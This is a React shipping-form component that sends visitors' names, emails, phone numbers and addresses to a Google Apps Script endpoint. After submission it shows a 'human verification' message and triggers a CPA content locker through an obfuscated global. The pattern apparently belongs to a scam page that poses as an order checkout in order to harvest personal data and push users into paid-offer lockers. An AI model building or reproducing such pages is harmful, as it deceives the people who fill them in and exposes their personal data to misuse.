import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/components/ui/use-toast";

const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxdD4k1FI88ZZl96PeLNPb9J3o7jNzTz2PrbU87lv8T0YoZphOFvDfUzh6gMf7m8zGc/exec";

const Shipping = () => {
  const { toast } = useToast();
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    zip: "",
    country: ""
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const response = await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors', // Required for Google Apps Script
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData)
      });

      // Since we're using no-cors, we can't actually check the response
      // We'll assume success if no error was thrown
      toast({
        title: "Shipping Info Received!",
        description: "Awaiting Human verification Completion!",
      });

      // Trigger content locker after successful submission
      if (window.dwdFP_HYI_jtEsDc) {
        // @ts-ignore - content locker global variable
        window.CPABuildLock();
      }
    } catch (error) {
      console.error('Submission error:', error);
      toast({
        title: "Error",
        description: "There was a problem submitting your order. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  return (
    <div className="min-h-screen bg-gray-50 py-12">
      <div className="container max-w-md mx-auto px-4">
        <h1 className="text-3xl font-bold text-center mb-8">Shipping Information</h1>
        
        <form onSubmit={handleSubmit} className="space-y-6 bg-white p-6 rounded-lg shadow">
          <div className="space-y-4">
            <Input
              name="name"
              placeholder="Full Name"
              value={formData.name}
              onChange={handleChange}
              required
            />
            <Input
              name="email"
              type="email"
              placeholder="Email"
              value={formData.email}
              onChange={handleChange}
              required
            />
            <Input
              name="phone"
              type="tel"
              placeholder="Phone Number"
              value={formData.phone}
              onChange={handleChange}
              required
            />
            <Input
              name="address"
              placeholder="Shipping Address"
              value={formData.address}
              onChange={handleChange}
              required
            />
            <Input
              name="city"
              placeholder="City"
              value={formData.city}
              onChange={handleChange}
              required
            />
            <Input
              name="zip"
              placeholder="ZIP Code"
              value={formData.zip}
              onChange={handleChange}
              required
            />
            <Input
              name="country"
              placeholder="Country"
              value={formData.country}
              onChange={handleChange}
              required
            />
          </div>
          
          <Button 
            type="submit" 
            className="w-full bg-secondary hover:bg-secondary/90"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Processing..." : "Complete Order"}
          </Button>
        </form>
      </div>
    </div>
  );
};

export default Shipping;
